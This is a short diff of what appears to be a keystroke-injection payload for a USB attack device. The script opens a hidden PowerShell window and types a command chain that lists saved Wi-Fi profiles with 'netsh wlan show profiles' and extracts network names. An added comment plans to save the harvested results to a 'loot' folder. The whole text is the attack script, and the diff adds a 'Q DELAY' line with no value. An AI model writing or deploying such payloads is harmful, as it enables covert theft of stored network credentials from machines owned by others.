@@ -1,4 +1,9 @@
 
+NEW IDEA:
+create powershell script file 
+run it and output results to loot folder
+
+
 
 Q DELAY 500
 Q RUN WIN powershell.exe -WindowStyle hidden 
@@ -7,7 +12,8 @@ Q ENTER
 LED G
 
 Q STRING (netsh wlan show profiles)
-Q SPACE 
+Q SPACE
+Q DELAY 
 Q STRING | Select-String "\:(.+)$"
 Q SPACE  
 Q STRING | %{$network=$_.Matches.Groups[1].Value.Trim(); $_}
